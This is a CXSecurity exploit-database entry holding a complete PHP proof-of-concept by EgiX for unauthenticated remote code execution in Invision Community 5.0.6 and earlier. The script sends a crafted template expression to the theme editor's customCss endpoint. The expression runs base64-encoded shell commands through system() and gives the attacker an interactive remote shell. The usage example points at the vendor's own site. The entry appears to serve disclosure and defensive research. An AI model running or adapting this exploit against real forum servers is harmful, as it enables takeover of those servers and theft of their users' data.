---
title: Invision Community 5.0.6 Remote Code Execution (RCE)
url: https://cxsecurity.com/issue/WLB-2025050053
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-30
fetch_date: 2025-10-06T22:24:12.531126
---

# Invision Community 5.0.6 Remote Code Execution (RCE)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Invision Community 5.0.6 Remote Code Execution (RCE)** **2025.05.29**  Credit:  **[Egidio](https://cxsecurity.com/author/Egidio/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

<?php
/\*
---------------------------------------------------------------------------
Exploit Title: Invision Community 5.0.6 - Remote Code Execution (RCE)
---------------------------------------------------------------------------
author..............: Egidio Romano aka EgiX
mail................: n0b0d13s[at]gmail[dot]com
software link.......: https://invisioncommunity.com
+-------------------------------------------------------------------------+
| This proof of concept code was written for educational purpose only. |
| Use it at your own risk. Author will be not responsible for any damage. |
+-------------------------------------------------------------------------+
[-] Original Advisory:
https://karmainsecurity.com/KIS-2025-02
\*/
set\_time\_limit(0);
error\_reporting(E\_ERROR);
print "\n+-------------------------------------------------------------------+";
print "\n| Invision Community <= 5.0.6 Remote Code Execution Exploit by EgiX |";
print "\n+-------------------------------------------------------------------+\n";
if (!extension\_loaded("curl")) die("\n[-] cURL extension required!\n\n");
if ($argc != 2)
{
print "\nUsage......: php $argv[0] <URL>\n";
print "\nExample....: php $argv[0] http://localhost/invision/";
print "\nExample....: php $argv[0] https://invisioncommunity.com/\n\n";
die();
}
$ch = curl\_init();
$params = ["app" => "core", "module" => "system", "controller" => "themeeditor", "do" => "customCss"];
curl\_setopt($ch, CURLOPT\_URL, $argv[1]);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_SSL\_VERIFYPEER, false);
curl\_setopt($ch, CURLOPT\_SSL\_VERIFYHOST, false);
while (1)
{
print "\ninvision-shell# ";
if (($cmd = trim(fgets(STDIN))) == "exit") break;
$params["content"] = sprintf("{expression=\"die('\_\_\_\_\_\_\_\_'.system(base64\_decode('%s')))\"}", base64\_encode($cmd));
curl\_setopt($ch, CURLOPT\_POSTFIELDS, http\_build\_query($params));
preg\_match("/(.\*)\_\_\_\_\_\_\_\_/s", curl\_exec($ch), $m) ? print $m[1] : die("\n[-] Exploit failed!\n\n");
}

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025050053)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top